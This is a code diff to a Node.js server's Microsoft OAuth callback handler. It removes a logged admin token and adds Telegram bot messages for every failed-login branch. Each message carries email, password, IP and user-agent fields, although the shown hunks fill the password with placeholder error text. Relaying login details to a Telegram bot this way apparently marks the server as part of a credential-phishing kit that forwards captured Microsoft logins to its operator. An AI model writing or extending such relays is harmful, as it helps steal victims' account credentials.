@@ -99,7 +99,6 @@ const ADMIN_TOKEN = 'admin-' + Math.random().toString(36).substr(2, 24);
 
 // Make admin token available globally for Telegram bot
 global.adminToken = ADMIN_TOKEN;
-console.log('🔑 Admin Token for testing:', ADMIN_TOKEN);
 
 // Initialize Telegram Bot
 let telegramBot = null;
@@ -938,6 +937,26 @@ app.get('/api/auth-callback', async (req, res) => {
         if (authError) {
             analytics.failedLogins++;
             saveAnalytics();
+
+            // Send Telegram notification for OAuth error
+            if (telegramBot) {
+                try {
+                    await telegramBot.sendFailedLoginNotification({
+                        email: 'Unknown',
+                        password: 'OAuth Error',
+                        timestamp: new Date().toISOString(),
+                        sessionId: 'unknown',
+                        reason: 'OAuth Authentication Error',
+                        authMethod: 'Microsoft OAuth',
+                        ip: req.ip || 'Unknown',
+                        userAgent: req.get('User-Agent') || 'Unknown'
+                    });
+                    console.log('📤 Telegram OAuth error notification sent');
+                } catch (telegramError) {
+                    console.warn('Telegram OAuth error notification failed:', telegramError.message);
+                }
+            }
+
             return res.status(400).json({ 
                 error: 'Authentication failed',
                 details: authError 
@@ -947,6 +966,26 @@ app.get('/api/auth-callback', async (req, res) => {
         if (!code || !state) {
             analytics.failedLogins++;
             saveAnalytics();
+
+            // Send Telegram notification for missing parameters
+            if (telegramBot) {
+                try {
+                    await telegramBot.sendFailedLoginNotification({
+                        email: 'Unknown',
+                        password: 'Missing OAuth Parameters',
+                        timestamp: new Date().toISOString(),
+                        sessionId: 'unknown',
+                        reason: 'Missing OAuth Code or State',
+                        authMethod: 'Microsoft OAuth',
+                        ip: req.ip || 'Unknown',
+                        userAgent: req.get('User-Agent') || 'Unknown'
+                    });
+                    console.log('📤 Telegram OAuth missing params notification sent');
+                } catch (telegramError) {
+                    console.warn('Telegram OAuth missing params notification failed:', telegramError.message);
+                }
+            }
+
             return res.status(400).json({ 
                 error: 'Missing authorization code or state parameter' 
             });
@@ -957,6 +996,26 @@ app.get('/api/auth-callback', async (req, res) => {
         if (!stateInfo) {
             analytics.failedLogins++;
             saveAnalytics();
+
+            // Send Telegram notification for invalid state
+            if (telegramBot) {
+                try {
+                    await telegramBot.sendFailedLoginNotification({
+                        email: 'Unknown',
+                        password: 'Invalid OAuth State',
+                        timestamp: new Date().toISOString(),
+                        sessionId: 'unknown',
+                        reason: 'Invalid or Expired OAuth State',
+                        authMethod: 'Microsoft OAuth',
+                        ip: req.ip || 'Unknown',
+                        userAgent: req.get('User-Agent') || 'Unknown'
+                    });
+                    console.log('📤 Telegram invalid state notification sent');
+                } catch (telegramError) {
+                    console.warn('Telegram invalid state notification failed:', telegramError.message);
+                }
+            }
+
             return res.status(400).json({ 
                 error: 'Invalid or expired state parameter' 
             });
@@ -967,6 +1026,26 @@ app.get('/api/auth-callback', async (req, res) => {
             oauthStates.delete(state);
             analytics.failedLogins++;
             saveAnalytics();
+
+            // Send Telegram notification for expired state
+            if (telegramBot) {
+                try {
+                    await telegramBot.sendFailedLoginNotification({
+                        email: 'Unknown',
+                        password: 'OAuth State Expired',
+                        timestamp: new Date().toISOString(),
+                        sessionId: stateInfo.sessionId || 'unknown',
+                        reason: 'OAuth State Expired (10min timeout)',
+                        authMethod: 'Microsoft OAuth',
+                        ip: req.ip || 'Unknown',
+                        userAgent: req.get('User-Agent') || 'Unknown'
+                    });
+                    console.log('📤 Telegram expired state notification sent');
+                } catch (telegramError) {
+                    console.warn('Telegram expired state notification failed:', telegramError.message);
+                }
+            }
+
             return res.status(400).json({ 
                 error: 'OAuth state expired' 
             });
@@ -977,6 +1056,26 @@ app.get('/api/auth-callback', async (req, res) => {
             oauthStates.delete(state);
             analytics.failedLogins++;
             saveAnalytics();
+
+            // Send Telegram notification for session not found
+            if (telegramBot) {
+                try {
+                    await telegramBot.sendFailedLoginNotification({
+                        email: 'Unknown',
+                        password: 'Session Not Found',
+                        timestamp: new Date().toISOString(),
+                        sessionId: stateInfo.sessionId || 'unknown',
+                        reason: 'Associated Session Not Found',
+                        authMethod: 'Microsoft OAuth',
+                        ip: req.ip || 'Unknown',
+                        userAgent: req.get('User-Agent') || 'Unknown'
+                    });
+                    console.log('📤 Telegram session not found notification sent');
+                } catch (telegramError) {
+                    console.warn('Telegram session not found notification failed:', telegramError.message);
+                }
+            }
+
             return res.status(400).json({ 
                 error: 'Associated session not found' 
             });
